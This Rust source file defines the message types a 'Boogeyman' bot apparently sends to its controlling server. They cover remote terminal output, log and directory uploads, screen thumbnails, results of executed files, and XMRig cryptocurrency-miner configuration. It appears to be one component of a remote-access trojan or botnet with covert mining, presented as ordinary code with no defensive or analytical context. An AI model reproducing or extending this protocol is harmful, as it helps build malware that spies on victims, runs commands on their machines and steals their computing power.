use serde::{ Deserialize, Serialize };
use super::structs::{ BotState, DynamicInfo };

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct BoogeymanSendPayload {
    pub id: String,
    pub version: u64,
    pub action: ServerAction,
    pub params: ServerParams,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ServerAction {
    Init,
    TerminalOutput,
    LogsData,
    CompressedDir,
    UpdateThumbnail,
    UpdateDynamicData,
    ExecFileOutput,
    XMRigConfig,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum ServerParams {
    Init(InitParams),
    TerminalOutput(TerminalOutputParams),
    LogsData(LogsDataParams),
    CompressedDir(CompressedDirParams),
    UpdateThumbnail(UpdateThumbnailParams),
    UpdateDynamicData(UpdateDynamicDataParams),
    ExecFileOutput(ExecFileOutputParams),
    XMRigConfig(XMRigConfigParams),
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ExecFileOutputParams {
    pub status: Option<i32>,
    pub stdout: Vec<u8>,
    pub stderr: Vec<u8>,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct XMRigConfigParams {
    pub config: String,
    pub summary: String,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct UpdateDynamicDataParams {
    pub dynamic_info: DynamicInfo,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct UpdateThumbnailParams {
    pub thumbnail: Option<Vec<u8>>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct TerminalOutputParams {
    pub output: Option<String>,
    pub error: Option<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct InitParams {
    pub bot_state: BotState,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct CompressedDirParams {}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct LogsDataParams {}
